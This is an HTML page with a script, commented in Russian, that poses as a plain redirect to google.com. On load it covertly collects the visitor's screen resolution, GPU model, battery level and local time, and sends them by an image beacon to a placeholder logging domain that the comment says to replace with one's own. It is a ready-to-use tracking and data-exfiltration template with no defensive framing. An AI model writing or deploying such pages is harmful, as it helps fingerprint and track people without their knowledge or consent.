<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
<script>
async function getSpecs() {
    let specs = {
        t: new Date().toLocaleString(),
        res: `${screen.width}x${screen.height}`,
        gpu: 'N/A',
        bat: 'N/A'
    };

    // Получение данных GPU
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        specs.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_ALGORITHM || debugInfo.UNMASKED_RENDERER_WEBGL);
    } catch (e) {}

    // Получение данных батареи
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            specs.bat = `${Math.round(battery.level * 100)}%`;
        }
    } catch (e) {}

    const params = new URLSearchParams(specs).toString();
    const workerUrl = "https://your-custom-domain.com/log"; // ЗАМЕНИТЬ НА СВОЙ ДОМЕН
    const redirectUrl = "https://google.com";

    const img = new Image();
    let sent = false;

    const finalize = () => {
        if (!sent) {
            sent = true;
            window.location.replace(redirectUrl);
        }
    };

    img.onload = finalize;
    img.onerror = finalize;
    img.src = `${workerUrl}?${params}`;

    setTimeout(finalize, 2500);
}

getSpecs();
</script>
</body>
</html>
